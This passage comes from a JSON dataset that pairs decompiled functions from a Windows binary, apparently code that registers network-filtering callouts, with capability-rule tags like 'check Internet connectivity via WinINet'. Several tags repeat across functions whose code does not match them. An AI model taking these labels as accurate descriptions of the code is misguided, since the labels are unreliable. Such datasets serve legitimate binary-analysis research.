!= 0; iVar1 = iVar1 + -1) {\n            *arg_8h = *puVar2;\n            puVar2 = puVar2 + 1;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    return var_c8h;\n}\n",
        "token_count": 1471
    },
    "00043240": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00043240(void)\n\n{\n    int32_t iVar1;\n    uint var_114h;\n    int32_t *var_110h;\n    int32_t *var_10ch;\n    uint var_108h;\n    \n    var_110h = NULL;\n    iVar1 = fcn.0001b770(0xb1c5b624, 1, 1);\n    if (iVar1 == 1) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00034830(5, &var_110h);\n        if (iVar1 == 0) {\n            var_10ch = var_110h;\n            while( true ) {\n                do {\n                    iVar1 = fcn.000368a0(var_10ch[0x11], &var_108h, 0x104);\n                } while (iVar1 == 0);\n                iVar1 = fcn.0007861c(&var_108h, 0xb1bdea14);\n                if (iVar1 == 0) {\n                    fcn.00043330(var_10ch[0x11]);\n                }\n                if (*var_10ch == 0) break;\n                var_10ch = var_10ch + *var_10ch;\n            }\n            fcn.00035330(var_110h);\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 315
    },
    "00043330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00043330(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.0001b770(0xb1c5b624, 1, 1);\n    if ((iVar1 != 1) && (iVar1 = fcn.0001a8e0(&var_8h, 0xb1c10380, arg_8h),  iVar1 == 0)) {\n        fcn.00037220(&var_8h);\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00043380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00043380(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_ch = arg_8h;\n    fcn.000209a0(1000);\n    var_10h = fcn.00058fa0(var_ch, 0xb1be20f8, &var_14h);\n    if (var_10h == 0) {\n        fcn.00059780(var_ch, var_14h);\n        iVar1 = fcn.0001b770(0xb1c5b624, 1, 0);\n        if (iVar1 == 0) {\n            *0xb1c5a5f4 = var_ch;\n            var_10h = fcn.000382d0();\n            if ((var_10h == 0) && (var_10h = fcn.00037ec0(),  var_10h == 0)) {\n                fcn.00046170();\n                *0xb1c5b5ac = *0xb1c5b0a4;\n                fcn.00078550(&var_8h, 0xb1be2100);\n                var_10h = (**0xb1bde198)(*0xb1c5b5ac, 0, &var_8h, 0, 0, 0, 0xb1c5b5b0);\n                if (((var_10h == 0) &&\n                    (((var_10h = fcn.00043700(),  var_10h == 0 && (var_10h = fcn.00043660(),  var_10h == 0)) &&\n                     (var_10h = fcn.000437a0(),  var_10h == 0)))) && (var_10h = fcn.000434f0(),  var_10h == 0)) {\n                    fcn.000458b0();\n                }\n            }\n            if (var_10h != 0) {\n                fcn.00036f40(0xb1c5b624, 0);\n            }\n        }\n        else {\n            var_10h = 0;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 518
    },
    "000434c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.000434c0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    while( true ) {\n        iVar1 = fcn.000340e0(0xb1c5b640, 3);\n        if (iVar1 != 0) break;\n        fcn.000437a0();\n    }\n    return 0;\n}\n",
        "token_count": 100
    },
    "00043560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00043560(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0xb1c5b638 != 0) {\n        fcn.000340b0(0xb1c5b640);\n        iVar1 = fcn.000372d0(0xb1c5b638);\n        if (iVar1 == 0) {\n            fcn.000785ec(*0xb1c5b638, 0, 0);\n        }\n        *0xb1c5b638 = 0;\n        *0xb1c5b63c = 0;\n        fcn.00034080(0xb1c5b640);\n    }\n    return 0;\n}\n",
        "token_count": 156
    },
    "000435c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000435c0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0001b770(0xb1c5b624, 1, 1);\n    if (iVar1 == 1) {\n        if ((arg_8h != 0) && (arg_8h != *0xb1c5a5f4)) {\n            iVar1 = fcn.00058fa0(arg_8h, 0xb1be20f8, &var_4h);\n            if (iVar1 != 0) {\n                return;\n            }\n            fcn.00059780(arg_8h, var_4h);\n        }\n        fcn.00036f40(0xb1c5b624, 0);\n        fcn.00043560();\n        fcn.000458d0();\n        fcn.00043770();\n        fcn.000436b0();\n        fcn.000461a0();\n        fcn.000444a0();\n        (**0xb1bde174)(*0xb1c5b5b0);\n        *0xb1c5a5f4 = 0;\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "00043660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __fastcall fcn.00043660(uint param_1)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    *0xb1c5b618 = (**0xb1c5b3d8)(*0xb1c5b5ac, 0x6f6e6553, 0, param_1);\n    if (*0xb1c5b618 == 0) {\n        uVar1 = 0xc0000017;\n    }\n    else {\n        uVar1 = (**0xb1c5b424)(2, 1, 0xb1c5b61c);\n    }\n    return uVar1;\n}\n",
        "token_count": 163
    },
    "000436b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.000436b0(void)\n\n{\n    if (*0xb1c5b61c != 0) {\n        (**0xb1c5b428)(*0xb1c5b61c);\n        *0xb1c5b61c = 0;\n    }\n    if (*0xb1c5b618 != 0) {\n        (**0xb1c5b3dc)(*0xb1c5b618);\n        *0xb1c5b618 = 0;\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "00043700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00043700(void)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_bh;\n    uint var_7h;\n    uint var_3h;\n    \n    var_bh._1_2_ = 0;\n    var_10h._0_1_ = 0x80;\n    stack0xffffffed = 0x1001;\n    var_bh._0_1_ = 1;\n    var_7h._3_1_ = 0;\n    var_3h._0_2_ = 0;\n    var_3h._2_1_ = 0;\n    stack0xfffffff4 = 0x706e6553;\n    *0xb1c5b620 = (**0xb1c5b3e0)(*0xb1c5b618, &var_10h);\n    if (*0xb1c5b620 == 0) {\n        uVar1 = 0xc0000017;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 263
    },
    "00043770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00043770(void)\n\n{\n    if (*0xb1c5b620 != 0) {\n        (**0xb1c5b3e4)(*0xb1c5b620);\n        *0xb1c5b620 = 0;\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "000437a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000437a0(void)\n\n{\n    int16_t iVar1;\n    uint var_270h;\n    uint var_268h;\n    uint *var_264h;\n    uint var_260h;\n    uint var_258h;\n    uint *var_254h;\n    uint var_250h;\n    uint var_248h;\n    uint *var_244h;\n    uint var_240h;\n    uint var_238h;\n    uint *var_234h;\n    uint var_230h;\n    uint var_228h;\n    int16_t *var_224h;\n    uint var_220h;\n    uint var_218h;\n    int16_t *var_214h;\n    uint var_210h;\n    uint var_208h;\n    uint *var_204h;\n    uint var_200h;\n    uint var_1f8h;\n    uint *var_1f4h;\n    uint var_1f0h;\n    uint var_1e8h;\n    uint *var_1e4h;\n    uint var_1e0h;\n    uint var_1d8h;\n    uint *var_1d4h;\n    uint var_1d0h;\n    uint var_1c8h;\n    uint *var_1c4h;\n    uint var_1c0h;\n    uint var_1b8h;\n    uint *var_1b4h;\n    uint var_1b0h;\n    uint var_1a8h;\n    uint *var_1a4h;\n    uint var_1a0h;\n    uint var_198h;\n    uint *var_194h;\n    uint var_190h;\n    uint var_188h;\n    uint *var_184h;\n    uint var_180h;\n    uint var_178h;\n    uint *var_174h;\n    uint var_170h;\n    uint var_168h;\n    int16_t *var_164h;\n    uint var_160h;\n    uint var_158h;\n    int16_t *var_154h;\n    uint var_150h;\n    ushort var_14ch;\n    ushort var_14ah;\n    ushort var_148h;\n    ushort var_146h;\n    ushort var_144h;\n    ushort var_142h;\n    ushort var_140h;\n    ushort var_13eh;\n    ushort var_13ch;\n    ushort var_13ah;\n    ushort var_138h;\n    uint var_134h;\n    ushort var_130h;\n    ushort var_12eh;\n    ushort var_12ch;\n    ushort var_12ah;\n    ushort var_128h;\n    ushort var_126h;\n    ushort var_124h;\n    ushort var_122h;\n    ushort var_120h;\n    ushort var_11eh;\n    ushort var_11ch;\n    ushort var_11ah;\n    ushort var_118h;\n    ushort var_116h;\n    int32_t var_114h;\n    uint var_110h;\n    ushort var_10ch;\n    ushort var_10ah;\n    ushort var_108h;\n    ushort var_106h;\n    ushort var_104h;\n    ushort var_102h;\n    ushort var_100h;\n    ushort var_feh;\n    ushort var_fch;\n    ushort var_fah;\n    ushort var_f8h;\n    ushort var_f6h;\n    uint var_f1h;\n    ushort var_ech;\n    ushort var_eah;\n    ushort var_e8h;\n    ushort var_e6h;\n    ushort var_e4h;\n    ushort var_e2h;\n    ushort var_e0h;\n    ushort var_deh;\n    ushort var_dch;\n    ushort var_dah;\n    ushort var_d8h;\n    ushort var_d6h;\n    ushort var_d4h;\n    uint var_d0h;\n    ushort var_cch;\n    ushort var_cah;\n    ushort var_c8h;\n    ushort var_c6h;\n    ushort var_c4h;\n    ushort var_c2h;\n    ushort var_c0h;\n    ushort var_beh;\n    ushort var_bch;\n    ushort var_bah;\n    ushort var_b8h;\n    ushort var_b6h;\n    ushort var_b4h;\n    uint var_b0h;\n    ushort var_ach;\n    ushort var_aah;\n    ushort var_a8h;\n    ushort var_a6h;\n    ushort var_a4h;\n    ushort var_a2h;\n    ushort var_a0h;\n    ushort var_9eh;\n    ushort var_9ch;\n    ushort var_9ah;\n    ushort var_98h;\n    ushort var_96h;\n    ushort var_94h;\n    uint var_90h;\n    ushort var_8ch;\n    ushort var_8ah;\n    ushort var_88h;\n    ushort var_86h;\n    ushort var_84h;\n    ushort var_82h;\n    ushort var_80h;\n    ushort var_7eh;\n    ushort var_7ch;\n    ushort var_7ah;\n    ushort var_78h;\n    ushort var_76h;\n    ushort var_74h;\n    ushort var_72h;\n    uint var_6dh;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_54h;\n    uint var_3ch;\n    ushort var_38h;\n    ushort var_36h;\n    ushort var_34h;\n    ushort var_32h;\n    ushort var_30h;\n    ushort var_2eh;\n    ushort var_2ch;\n    ushort var_2ah;\n    ushort var_28h;\n    ushort var_26h;\n    ushort var_24h;\n    ushort var_22h;\n    int16_t var_20h [4];\n    ushort var_18h;\n    ushort var_16h;\n    ushort var_14h;\n    ushort var_12h;\n    ushort var_10h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    ushort var_8h;\n    ushort var_6h;\n    ushort var_4h;\n    \n    var_114h = 0;\n    var_6dh._0_1_ = '\\0';\n    var_f1h._0_1_ = '\\0';\n    var_f1h._1_2_ = 0x72;\n    stack0xffffff0e = 0x6b;\n    var_ech = 0x6e;\n    var_eah = 0x67;\n    var_e8h = 0x5f;\n    var_e6h = 0x73;\n    var_e4h = 0x65;\n    var_e2h = 0x73;\n    var_e0h = 0x73;\n    var_deh = 0x69;\n    var_dch = 0x6f;\n    var_dah = 0x6e;\n    var_d8h = 0;\n    var_d6h = 0;\n    var_d4h = 0;\n    var_3ch._0_2_ = 0x73;\n    var_3ch._2_2_ = 0x74;\n    var_38h = 0x72;\n    var_36h = 0x65;\n    var_34h = 0x61;\n    var_32h = 0x6d;\n    var_30h = 0x5f;\n    var_2eh = 99;\n    var_2ch = 0x61;\n    var_2ah = 0x6f;\n    var_28h = 0x74;\n    var_26h = 0;\n    var_24h = 0;\n    var_22h = 0;\n    var_150h._0_2_ = 0x65;\n    var_150h._2_2_ = 0x73;\n    var_14ch = 0x74;\n    var_14ah = 0x62;\n    var_148h = 0x6c;\n    var_146h = 0x5f;\n    var_144h = 99;\n    var_142h = 0x61;\n    var_140h = 0x6f;\n    var_13eh = 0x74;\n    var_13ch = 0;\n    var_13ah = 0;\n    var_138h = 0;\n    var_90h._0_2_ = 0x73;\n    var_90h._2_2_ = 0x74;\n    var_8ch = 0x72;\n    var_8ah = 0x65;\n    var_88h = 0x61;\n    var_86h = 0x6d;\n    var_84h = 0x5f;\n    var_82h = 0x66;\n    var_80h = 0x69;\n    var_7eh = 0x6c;\n    var_7ch = 0x74;\n    var_7ah = 0x65;\n    var_78h = 0x72;\n    var_76h = 0;\n    var_74h = 0;\n    var_72h = 0;\n    var_b0h._0_2_ = 0x65;\n    var_b0h._2_2_ = 0x73;\n    var_ach = 0x74;\n    var_aah = 0x62;\n    var_a8h = 0x6c;\n    var_a6h = 0x5f;\n    var_a4h = 0x66;\n    var_a2h = 0x69;\n    var_a0h = 0x6c;\n    var_9eh = 0x74;\n    var_9ch = 0x65;\n    var_9ah = 0x72;\n    var_98h = 0;\n    var_96h = 0;\n    var_94h = 0;\n    var_110h._0_2_ = 0x61;\n    var_110h._2_2_ = 99;\n    var_10ch = 99;\n    var_10ah = 0x65;\n    var_108h = 0x70;\n    var_106h = 0x74;\n    var_104h = 0x5f;\n    var_102h = 99;\n    var_100h = 0x61;\n    var_feh = 0x6f;\n    var_fch = 0x74;\n    var_fah = 0;\n    var_f8h = 0;\n    var_f6h = 0;\n    var_20h[0] = 99;\n    var_20h[1] = 0x6f;\n    var_20h[2] = 0x6e;\n    var_20h[3] = 0x6e;\n    var_18h = 0x65;\n    var_16h = 99;\n    var_14h = 0x74;\n    var_12h = 0x5f;\n    var_10h = 99;\n    var_eh = 0x61;\n    var_ch = 0x6f;\n    var_ah = 0x74;\n    var_8h = 0;\n    var_6h = 0;\n    var_4h = 0;\n    var_d0h._0_2_ = 0x74;\n    var_d0h._2_2_ = 0x72;\n    var_cch = 0x61;\n    var_cah = 0x6e;\n    var_c8h = 0x73;\n    var_c6h = 0x69;\n    var_c4h = 0x6e;\n    var_c2h = 0x5f;\n    var_c0h = 99;\n    var_beh = 0x61;\n    var_bch = 0x6f;\n    var_bah = 0x74;\n    var_b8h = 0;\n    var_b6h = 0;\n    var_b4h = 0;\n    var_134h._0_2_ = 0x74;\n    var_134h._2_2_ = 0x72;\n    var_130h = 0x61;\n    var_12eh = 0x6e;\n    var_12ch = 0x73;\n    var_12ah = 0x6f;\n    var_128h = 0x75;\n    var_126h = 0x74;\n    var_124h = 0x5f;\n    var_122h = 99;\n    var_120h = 0x61;\n    var_11eh = 0x6f;\n    var_11ch = 0x74;\n    var_11ah = 0;\n    var_118h = 0;\n    var_116h = 0;\n    stack0xffffff90 = 0;\n    fcn.00078790(&var_68h, 0, 0x2c);\n    var_154h = &var_f1h + 1;\n    do {\n        iVar1 = *var_154h;\n        var_154h = var_154h + 1;\n    } while (iVar1 != 0);\n    var_164h = &var_f1h + 1;\n    do {\n        iVar1 = *var_164h;\n        var_164h = var_164h + 1;\n    } while (iVar1 != 0);\n    fcn.00037d60(&var_f1h + 1, &var_f1h + (var_164h - (&var_f1h + 3) >> 1) * 2 + 1, \n                 &var_f1h + (var_154h - (&var_f1h + 3) >> 1) * 2 + 3);\n    var_174h = &var_3ch;\n    do {\n        iVar1 = *var_174h;\n        var_174h = var_174h + 2;\n    } while (iVar1 != 0);\n    var_184h = &var_3ch;\n    do {\n        iVar1 = *var_184h;\n        var_184h = var_184h + 2;\n    } while (iVar1 != 0);\n    fcn.00037d60(&var_3ch, &var_3ch + (var_184h - (&var_3ch + 2) >> 1) * 2, \n                 &var_3ch + (var_174h - (&var_3ch + 2) >> 1) * 2 + 2);\n    var_194h = &var_150h;\n    do {\n        iVar1 = *var_194h;\n        var_194h = var_194h + 2;\n    } while (iVar1 != 0);\n    var_1a4h = &var_150h;\n    do {\n        iVar1 = *var_1a4h;\n        var_1a4h = var_1a4h + 2;\n    } while (iVar1 != 0);\n    fcn.00037d60(&var_150h, &var_150h + (var_1a4h - (&var_150h + 2) >> 1) * 2, \n                 &var_150h + (var_194h - (&var_150h + 2) >> 1) * 2 + 2);\n    var_1b4h = &var_90h;\n    do {\n        iVar1 = *var_1b4h;\n        var_1b4h = var_1b4h + 2;\n    } while (iVar1 != 0);\n    var_1c4h = &var_90h;\n    do {\n        iVar1 = *var_1c4h;\n        var_1c4h = var_1c4h + 2;\n    } while (iVar1 != 0);\n    fcn.00037d60(&var_90h, &var_90h + (var_1c4h - (&var_90h + 2) >> 1) * 2, \n                 &var_90h + (var_1b4h - (&var_90h + 2) >> 1) * 2 + 2);\n    var_1d4h = &var_b0h;\n    do {\n        iVar1 = *var_1d4h;\n        var_1d4h = var_1d4h + 2;\n    } while (iVar1 != 0);\n    var_1e4h = &var_b0h;\n    do {\n        iVar1 = *var_1e4h;\n        var_1e4h = var_1e4h + 2;\n    } while (iVar1 != 0);\n    fcn.00037d60(&var_b0h, &var_b0h + (var_1e4h - (&var_b0h + 2) >> 1) * 2, \n                 &var_b0h + (var_1d4h - (&var_b0h + 2) >> 1) * 2 + 2);\n    var_1f4h = &var_110h;\n    do {\n        iVar1 = *var_1f4h;\n        var_1f4h = var_1f4h + 2;\n    } while (iVar1 != 0);\n    var_204h = &var_110h;\n    do {\n        iVar1 = *var_204h;\n        var_204h = var_204h + 2;\n    } while (iVar1 != 0);\n    fcn.00037d60(&var_110h, &var_110h + (var_204h - (&var_110h + 2) >> 1) * 2, \n                 &var_110h + (var_1f4h - (&var_110h + 2) >> 1) * 2 + 2);\n    var_214h = var_20h;\n    do {\n        iVar1 = *var_214h;\n        var_214h = var_214h + 1;\n    } while (iVar1 != 0);\n    var_224h = var_20h;\n    do {\n        iVar1 = *var_224h;\n        var_224h = var_224h + 1;\n    } while (iVar1 != 0);\n    fcn.00037d60(var_20h, var_20h + (var_224h - (var_20h + 1) >> 1), var_20h + (var_214h - (var_20h + 1) >> 1) + 1);\n    var_234h = &var_d0h;\n    do {\n        iVar1 = *var_234h;\n        var_234h = var_234h + 2;\n    } while (iVar1 != 0);\n    var_244h = &var_d0h;\n    do {\n        iVar1 = *var_244h;\n        var_244h = var_244h + 2;\n    } while (iVar1 != 0);\n    fcn.00037d60(&var_d0h, &var_d0h + (var_244h - (&var_d0h + 2) >> 1) * 2, \n                 &var_d0h + (var_234h - (&var_d0h + 2) >> 1) * 2 + 2);\n    var_254h = &var_134h;\n    do {\n        iVar1 = *var_254h;\n        var_254h = var_254h + 2;\n    } while (iVar1 != 0);\n    var_264h = &var_134h;\n    do {\n        iVar1 = *var_264h;\n        var_264h = var_264h + 2;\n    } while (iVar1 != 0);\n    fcn.00037d60(&var_134h, &var_134h + (var_264h - (&var_134h + 2) >> 1) * 2, \n                 &var_134h + (var_254h - (&var_134h + 2) >> 1) * 2 + 2);\n    var_54h = 1;\n    var_5ch = &var_f1h + 1;\n    if (*0xb1c5b5b4 == 0) {\n        var_114h = (**0xb1c5b43c)(0, 10, 0, &var_6dh + 1, 0xb1c5b5b4);\n        if (var_114h != 0) goto code_r0x00044450;\n        *0xb1c5b628 = stack0xffffff90;\n        *0xb1c5b62c = var_68h;\n        *0xb1c5b630 = var_64h;\n        *0xb1c5b634 = var_60h;\n    }\n    var_6dh._0_1_ = '\\x01';\n    var_114h = (**0xb1c5b434)(*0xb1c5b5b4, 0);\n    if (var_114h == 0) {\n        var_f1h._0_1_ = '\\x01';\n        var_114h = fcn.00044c00(0xb1bdec18, 0xb1bdf558, *0xb1c5b5b0, 0xb1c12040, 0xb1c2e810, 0xb1c12720, &var_3ch, \n                                &var_90h, 0xb1c5b5b8, 0xb1c5b5c0);\n        if (((var_114h == 0) &&\n            (var_114h = fcn.00044c00(0xb1bdee18, 0xb1bdf568, *0xb1c5b5b0, 0xb1c12520, 0xb1c2e810, 0, &var_150h, &var_b0h\n                                     , 0xb1c5b5c8, 0xb1c5b5d0),  var_114h == 0)) &&\n           (var_114h = (**0xb1c5b438)(*0xb1c5b5b4),  var_114h == 0)) {\n            var_f1h._0_1_ = '\\0';\n        }\n    }\ncode_r0x00044450:\n    if (var_114h != 0) {\n        if (var_f1h != '\\0') {\n            (**0xb1c5b430)(*0xb1c5b5b4);\n        }\n        if (var_6dh != '\\0') {\n            (**0xb1c5b42c)(*0xb1c5b5b4);\n            *0xb1c5b5b4 = 0;\n        }\n    }\n    return var_114h;\n}\n",
        "token_count": 5179
    },
    "000444a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.000444a0(void)\n\n{\n    if (*0xb1c5b5b8 != 0) {\n        (**0xb1c5b440)(*0xb1c5b5b8);\n    }\n    if (*0xb1c5b5c8 != 0) {\n        (**0xb1c5b440)(*0xb1c5b5c8);\n    }\n    if (*0xb1c5b5d8 != 0) {\n        (**0xb1c5b440)(*0xb1c5b5d8);\n    }\n    if (*0xb1c5b5e8 != 0) {\n        (**0xb1c5b440)(*0xb1c5b5e8);\n    }\n    if (*0xb1c5b5f8 != 0) {\n        (**0xb1c5b440)(*0xb1c5b5f8);\n    }\n    if (*0xb1c5b608 != 0) {\n        (**0xb1c5b440)(*0xb1c5b608);\n    }\n    if (*0xb1c5b5b4 != 0) {\n        (**0xb1c5b42c)(*0xb1c5b5b4);\n    }\n    *0xb1c5b5b4 = 0;\n    return;\n}\n",
        "token_count": 301
    },
    "00044650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00044650(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t *var_88h;\n    int32_t *var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t *var_70h;\n    int32_t *var_6ch;\n    uint32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_3ch;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    char var_15h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t *var_4h;\n    \n    var_20h = NULL;\n    var_10h = 0;\n    var_24h = 0;\n    var_4h = NULL;\n    var_1ch = 0;\n    *0xb1c5a5f8 = *0xb1bdef28;\n    *0xb1c5a5fc = *0xb1bdef2c;\n    *0xb1c5a600 = *0xb1bdef30;\n    *0xb1c5a604 = *0xb1bdef34;\n    fcn.00078790(&var_64h, 0, 0x30);\n    var_60h = *arg_ch;\n    var_5ch = arg_ch[1];\n    var_58h = arg_ch[2];\n    var_54h = arg_ch[3];\n    var_3ch = 0xffffffff;\n    var_50h = 1;\n    var_ch = (**0xb1c685a0)(arg_8h, &var_64h, &var_10h);\n    if ((((var_ch == 0) && (var_ch = (**0xb1c68598)(arg_8h, var_10h, 0xffffffff, &var_4h, &var_8h),  var_ch == 0)) &&\n        (var_8h != 0)) && (var_20h = fcn.00035200(0x10),  var_20h != NULL)) {\n        iVar1 = *var_4h;\n        *var_20h = *(iVar1 + 0x38);\n        var_20h[1] = *(iVar1 + 0x3c);\n        var_20h[2] = *(iVar1 + 0x40);\n        var_20h[3] = *(iVar1 + 0x44);\n        var_28h = 1;\n        for (var_14h = 1; var_14h < var_8h; var_14h = var_14h + 1) {\n            var_15h = '\\0';\n            for (var_34h = 0; var_34h < var_28h; var_34h = var_34h + 1) {\n                var_68h = 0x10;\n                var_6ch = var_4h[var_14h] + 0x38;\n                var_70h = var_20h + var_34h * 4;\n                for (; 3 < var_68h; var_68h = var_68h - 4) {\n                    if (*var_70h != *var_6ch) goto code_r0x000447fc;\n                    var_6ch = var_6ch + 1;\n                    var_70h = var_70h + 1;\n                }\n                if (var_68h == 0) {\ncode_r0x0004487e:\n                    var_78h = 0;\n                }\n                else {\ncode_r0x000447fc:\n                    var_74h = *var_70h - *var_6ch;\n                    if (var_74h == 0) {\n                        if (var_68h == 1) goto code_r0x0004487e;\n                        var_74h = *(var_70h + 1) - *(var_6ch + 1);\n                        if (var_74h == 0) {\n                            if (var_68h == 2) goto code_r0x0004487e;\n                            var_74h = *(var_70h + 2) - *(var_6ch + 2);\n                            if (var_74h == 0) {\n                                if ((var_68h == 3) || (var_74h = *(var_70h + 3) - *(var_6ch + 3),  var_74h == 0))\n                                goto code_r0x0004487e;\n                            }\n                        }\n                    }\n                    var_78h = 1;\n                    if (var_74h < 1) {\n                        var_78h = -1;\n                    }\n                }\n                if (var_78h == 0) {\n                    var_15h = '\\x01';\n                    break;\n                }\n            }\n            if (var_15h == '\\0') {\n                iVar1 = fcn.0001d7c0(&var_20h, var_28h << 4, (var_28h + 1) * 0x10);\n                if (iVar1 < 0) goto code_r0x00044b8f;\n                iVar1 = var_4h[var_14h];\n                puVar2 = var_20h + var_28h * 4;\n                *puVar2 = *(iVar1 + 0x38);\n                puVar2[1] = *(iVar1 + 0x3c);\n                puVar2[2] = *(iVar1 + 0x40);\n                puVar2[3] = *(iVar1 + 0x44);\n                var_28h = var_28h + 1;\n            }\n        }\n        if (var_28h == 1) {\n            iVar1 = *var_4h;\n            *0xb1c5a5f8 = *(iVar1 + 0x38);\n            *0xb1c5a5fc = *(iVar1 + 0x3c);\n            *0xb1c5a600 = *(iVar1 + 0x40);\n            *0xb1c5a604 = *(iVar1 + 0x44);\n        }\n        else {\n            var_ch = (**0xb1c685a4)(arg_8h, 0, &var_24h);\n            if ((var_ch == 0) &&\n               (var_ch = (**0xb1c685a8)(arg_8h, var_24h, 0xffffffff, &var_1ch, &var_2ch),  var_ch == 0)) {\n                var_30h._0_2_ = 0;\n                for (var_34h = 0; var_34h < var_28h; var_34h = var_34h + 1) {\n                    for (var_14h = 0; var_14h < var_2ch; var_14h = var_14h + 1) {\n                        var_80h = 0x10;\n                        var_84h = *(var_1ch + var_14h * 4);\n                        var_88h = var_20h + var_34h * 4;\n                        for (; 3 < var_80h; var_80h = var_80h - 4) {\n                            if (*var_88h != *var_84h) goto code_r0x00044a2b;\n                            var_84h = var_84h + 1;\n                            var_88h = var_88h + 1;\n                        }\n                        if (var_80h == 0) {\ncode_r0x00044aeb:\n                            var_90h = 0;\n                        